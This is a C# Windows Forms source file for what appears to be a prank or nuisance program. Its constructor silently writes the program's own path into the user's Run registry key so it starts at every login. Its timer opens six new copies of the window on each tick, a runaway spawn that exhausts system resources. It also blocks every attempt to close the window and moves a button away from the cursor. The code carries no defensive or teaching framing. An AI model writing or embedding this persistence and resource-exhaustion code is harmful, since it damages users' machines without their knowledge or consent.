/*
 * Created by SharpDevelop.
 * User: walzju
 * Date: 15.06.2021
 * Time: 16:57
 * 
 * To change this template use Tools | Options | Coding | Edit Standard Headers.
 */
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;

using System.ComponentModel;
using System.Data;
using System.Text;
using Microsoft.Win32;

namespace abc
{
	/// <summary>
	/// Description of MainForm.
	/// </summary>
	public partial class MainForm : Form
	{
		

		public MainForm()
		{
			//
			// The InitializeComponent() call is required for Windows Forms designer support.
			//
			InitializeComponent();
			
			//
			// TODO: Add constructor code after the InitializeComponent() call.
			//
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
		registryKey.SetValue("MainForm", System.Reflection.Assembly.GetExecutingAssembly().Location);
		}
		
		void CheckBox1CheckedChanged(object sender, EventArgs e)
		{
			if (checkBox1.Checked) button1.Enabled = true;
			else button1.Enabled = false;
		}
		
		void Button1Click(object sender, EventArgs e)
		{
			button1.Text = "BJUGVUIPGVUIVFZIVZI";
			if (label3.ForeColor == Color.Yellow)
				label3.ForeColor = Color.Black;
			else
				label3.ForeColor = Color.Yellow;
				
		}
		
		void Label3Click(object sender, EventArgs e)
		{
			
		}

		
		
		void Label4Click(object sender, EventArgs e)
		{
			
		}
		
		void Button2MouseEnter(object sender, EventArgs e)
		{
			  Random random= new Random();
			  button2.Location = new Point(random.Next(0, this.ClientSize.Width - button2.Size.Width), random.Next(0, this.ClientSize.Height - button2.Size.Height));
			  //
		}
		
		void Button2Click(object sender, EventArgs e)
		{
			timer1.Stop();
		}
		
		void MainFormLoad(object sender, EventArgs e)
		{
			FormBorderStyle = FormBorderStyle.None;
WindowState = FormWindowState.Maximized;
		}
		
		void MainFormClick(object sender, EventArgs e)
		{
			Random rnd = new Random();
		
			this.BackColor = Color.FromArgb(rnd.Next(0, 255),rnd.Next(0, 255),rnd.Next(0, 255));
		}
		
		void Timer1Tick(object sender, EventArgs e)
		{
MainForm newForm = new MainForm();
newForm.Show();
MainForm newForm2 = new MainForm();
newForm2.Show();
MainForm newForm3 = new MainForm();
newForm3.Show();
MainForm newForm4 = new MainForm();
newForm4.Show();
MainForm newForm5 = new MainForm();
newForm5.Show();
MainForm newForm6 = new MainForm();
newForm6.Show();
			Random rnd = new Random();
			this.BackColor = Color.FromArgb(rnd.Next(0, 255),rnd.Next(0, 255),rnd.Next(0, 255));
		}
		
		
		
		void MainFormFormClosing(object sender, FormClosingEventArgs e)
		{
e.Cancel = true;
		}
	}
}
